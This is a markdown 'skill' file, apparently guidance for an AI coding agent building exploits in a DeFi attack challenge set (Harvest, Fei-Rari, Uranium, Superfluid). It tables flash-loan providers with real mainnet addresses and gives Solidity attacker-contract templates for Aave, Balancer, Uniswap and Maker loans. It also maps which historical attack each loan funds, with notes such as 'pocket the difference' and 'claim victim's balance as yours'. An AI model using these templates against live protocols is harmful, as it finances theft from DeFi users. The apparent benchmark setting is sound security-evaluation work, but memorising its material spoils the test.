# flash_loan.skill.md

Primary consumer: Codex. Read during `poc`/`exploit` tasks for ch2 (Harvest — amplifies oracle manip) and ch3 (Fei-Rari — provides the collateral for the reentrancy setup). ch1/ch4/ch5 don't strictly need flash loans.

Goal: pick the provider with (a) the lowest fee, (b) enough liquidity for your target size, (c) a callback you can implement cleanly.

---

## 1. Provider matrix

### 1.1 Ethereum (ch2 Harvest, ch3 Fei-Rari)

| Provider | Fee | Assets | Liquidity ceiling (approx) | Callback |
|---|---|---|---|---|
| **Aave V2** (`0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9` LendingPool) | 0.09% (9 bps) | WETH, USDC, USDT, DAI, WBTC, most majors | $100M-1B per asset | `executeOperation(address[],uint256[],uint256[],address,bytes)` |
| **Aave V3** (`0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2` Pool) | 0.05% (5 bps) | Same as V2 + newer | Similar | `executeOperation(address[],uint256[],uint256[],address,bytes)` (same sig) |
| **Balancer V2 Vault** (`0xBA12222222228d8Ba445958a75a0704d566BF2C8`) | **0%** | Only tokens present in pools; WETH/USDC/DAI always, most others often | Limited by pool size per asset | `receiveFlashLoan(IERC20[],uint256[],uint256[] feeAmounts,bytes)` |
| **Maker DSS-Flash** (`0x60744434d6339a6B27d73d9Eda62b6F66a0a04FA` DssFlash) | **0%** | **DAI only** | 500M DAI cap | `onFlashLoan(address,address,uint256,uint256,bytes)` (ERC-3156) |
| **Morpho Blue** (`0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb`) | **0%** | Any market asset | Market-dependent | `onMorphoFlashLoan(uint256 assets,bytes)` |
| **Uniswap V2 flash-swap** | effectively 0.3% (swap fee) | Any pair | pair reserve | `uniswapV2Call(address,uint256,uint256,bytes)` |
| **Uniswap V3 flash** | tier fee (0.01% / 0.05% / 0.3% / 1%) | Any pool | pool liquidity | `uniswapV3FlashCallback(uint256,uint256,bytes)` |

Heuristics:
- **Need DAI, any size up to 500M?** → Maker DSS-Flash. Zero fee.
- **Need WETH/USDC and pool has it?** → Balancer. Zero fee.
- **Large volume (>500M equivalent) or non-DAI/non-Balancer asset?** → Aave V3 (cheaper than V2).
- **Trivial pair-local amount?** → Uniswap V2 flash-swap of that exact pair (avoids the extra Aave hop). 0.3% swap fee is baked in.

### 1.2 Polygon (ch4/ch5 — probably don't need)

| Provider | Fee | Callback |
|---|---|---|
| Aave V3 (`0x794a61358D6845594F94dc1DB02A252b5b4814aD`) | 0.05% | `executeOperation(...)` same sig |
| Balancer V2 (`0xBA12222222228d8Ba445958a75a0704d566BF2C8`, same address as mainnet) | 0% | `receiveFlashLoan(...)` |

### 1.3 BSC (ch1 Uranium — probably don't need)

| Provider | Fee | Callback |
|---|---|---|
| PancakeSwap V2 flash-swap | 0.25% swap fee | `pancakeCall(address,uint256,uint256,bytes)` |
| DODO V1/V2 flash loan | 0% (strict liquidity) | `DVMFlashLoanCall(address,uint256,uint256,bytes)` |
| Aave V3 (recent) | 0.05% | `executeOperation(...)` |

For ch1 Uranium, the simplest path is: PancakeSwap flash-swap → borrow WBNB from a large pair → exploit Uranium's bad K → repay on the pair with the swap fee baked in → pocket the difference. No need for Aave/Balancer.

---

## 2. Callback signatures (concrete code)

### 2.1 Aave V2 / V3 (same sig)

```solidity
interface IPoolV3 {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata interestRateModes,  // all 0 for flash
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;

    // Simpler single-asset version (V3 only):
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

contract AaveAttacker {
    address constant POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2; // V3 mainnet

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        require(msg.sender == POOL, "bad caller");
        require(initiator == address(this), "bad initiator");

        // ... exploit logic ...
        // You now hold amounts[i] of assets[i]. Do the attack.

        // Repay: approve premium + principal back to the pool
        for (uint i = 0; i < assets.length; i++) {
            uint256 owed = amounts[i] + premiums[i];
            IERC20(assets[i]).approve(POOL, owed);
        }
        return true;
    }

    function run() external {
        address[] memory assets = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        uint256[] memory modes   = new uint256[](1);  // 0 = flash
        assets[0] = USDC;  amounts[0] = 150_000_000e6;  modes[0] = 0;
        IPoolV3(POOL).flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }
}
```

### 2.2 Balancer V2 Vault

```solidity
interface IVault {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData) external;
}

contract BalancerAttacker {
    address constant VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,  // always 0 for Balancer
        bytes calldata userData
    ) external {
        require(msg.sender == VAULT, "bad caller");

        // ... exploit logic ...

        // Repay by transferring principal back (fee is 0 so no premium to add)
        for (uint i = 0; i < tokens.length; i++) {
            IERC20(tokens[i]).transfer(VAULT, amounts[i]);
        }
    }

    function run() external {
        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = USDC;  amounts[0] = 200_000_000e6;
        IVault(VAULT).flashLoan(address(this), tokens, amounts, "");
    }
}
```

### 2.3 Uniswap V2 flash-swap

```solidity
interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
}

contract FlashSwapAttacker {
    address public immutable PAIR;

    constructor(address pair) { PAIR = pair; }

    function run(uint256 amount0Out, uint256 amount1Out) external {
        // Non-empty data[] triggers the callback
        IUniswapV2Pair(PAIR).swap(amount0Out, amount1Out, address(this), abi.encode("go"));
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == PAIR, "bad caller");
        require(sender == address(this), "bad sender");

        // ... exploit logic — you hold amount0/amount1 of the pair's tokens ...

        // Repay: need to send back tokens so that K after is >= K before.
        // With 0.3% fee: amountIn = amountOut * 1000 / 997 (ceil).
        // Simpler if you hold the other token already from the exploit:
        uint256 owed0 = amount0 * 1000 / 997 + 1;
        uint256 owed1 = amount1 * 1000 / 997 + 1;
        if (amount0 > 0) IERC20(IUniswapV2Pair(PAIR).token0()).transfer(PAIR, owed0);
        if (amount1 > 0) IERC20(IUniswapV2Pair(PAIR).token1()).transfer(PAIR, owed1);
    }
}
```

### 2.4 Maker DSS-Flash (ERC-3156)

```solidity
interface IERC3156FlashLender {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external returns (bool);
}

contract MakerFlashAttacker {
    address constant DSS_FLASH = 0x60744434d6339a6B27d73d9Eda62b6F66a0a04FA;
    address constant DAI       = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
        external returns (bytes32)
    {
        require(msg.sender == DSS_FLASH, "bad caller");
        require(initiator == address(this), "bad initiator");
        require(fee == 0, "maker is 0% unless toll set");

        // ... exploit ...

        IERC20(DAI).approve(DSS_FLASH, amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function run() external {
        IERC3156FlashLender(DSS_FLASH).flashLoan(address(this), DAI, 500_000_000e18, "");
    }
}
```

---

## 3. Picking the right provider per challenge

**ch2 Harvest (Ethereum)**:
- The historical attacker used Uniswap V2 flash-swap of USDC directly.
- Cleanest for our PoC: Balancer USDC flash (0% fee, one hop). If Balancer's USDC pool is thin at the fork block, fall back to Aave V2.
- For really large sizes (>$500M of the Curve yUSD pool): multiple sequential Balancer flashes or Maker DSS-Flash for DAI then swap to USDC.

**ch3 Fei-Rari (Ethereum)**:
- Historical attack used Balancer DAI+USDC+USDT+WETH multi-asset flash.
- Same approach works. Balancer V2 vault has all four. 0% fee is critical at that scale ($80M stolen originally).

**ch1 Uranium (BSC)**:
- PancakeSwap V2 flash-swap of the largest WBNB pair. The K-invariant bug means even the 0.25% swap fee is dwarfed by the extraction.
- Or just fund the attack from the attacker EOA's own balance — at fork block you start with ~$0. You'll need some seed capital. `vm.deal(ATTACKER, 100 ether)` in PoC; for the real Run.s.sol, PancakeSwap flash-swap is mandatory.

**ch4 Superfluid (Polygon) / ch5 Superfluid_v2 (Polygon)**:
- Ctx forgery exploit has **zero capital requirement**. The whole attack is "claim victim's balance as yours". No flash loan needed.
- Don't overengineer. Skip this skill for ch4/ch5 unless you're combining vectors (see `creative_escalation.skill.md` §4).

---

## 4. Repayment math reference

| Provider | Repayment |
|---|---|
| Aave V2 | `amount + amount * 9 / 10000` (0.09%) |
| Aave V3 | `amount + amount * 5 / 10000` (0.05%) |
| Balancer | `amount` (fee 0) |
| Maker | `amount + fee` (fee almost always 0; read via `DssFlash.toll()` to verify) |
| Morpho | `amount` (fee 0) |
| Uniswap V2 | `amount * 1000 / 997 + 1` (0.3% fee, rounded up) |
| Uniswap V3 0.05% | `amount * 10000 / 9995 + 1` |
| Uniswap V3 0.3% | `amount * 10000 / 9970 + 1` |

Always approve or transfer the exact repayment amount, not `amount`. Aave reverts if allowance is insufficient; UniV2 reverts with `K` error if the pair's post-swap K < pre-swap K.

---

## 5. Common failure modes

- **"Aave: flash loan not enabled"** — the asset isn't flash-enabled. Check `DataProvider.getFlashLoanEnabled(asset)`.
- **Balancer "BAL#528"** — flash loan amount exceeds pool's tracked balance. Check vault's token balance via `cast call $VAULT 'totalSupply(bytes32)' $POOL_ID`.
- **UniV2 "UniswapV2: K"** — you didn't repay enough. The pair checks `(reserve0_new * reserve1_new) >= (reserve0_old * reserve1_old)` after adjusting for the 0.3% fee on the net input. If you took out `amount0Out` and put back `amountIn` of token1, the check is `(reserve0 - amount0Out) * (reserve1 + amountIn * 997/1000) >= reserve0 * reserve1`.
- **UniV3 "LOK"** — reentrancy lock. Don't call back into the same pool during the callback.
- **Out of gas in callback** — flash loans call with limited gas budget. Split the exploit into multiple smaller flash loans if OOG.

---

## 6. When you think you need a flash loan but you don't

Before reaching for one, check:
- Does the PoC work without it? Many exploits look capital-intensive but the capital is only to prove the bug. For the scored-on-fork version you can often seed from `vm.deal`.
- In `Run.s.sol` you do need real balance. But the reset endpoint means failure costs nothing; you can iterate on smaller amounts first.

The cost of a flash loan is extra complexity in the PoC (another contract, another callback). Skip it until the no-flash version clearly runs out of the attacker EOA's free balance.
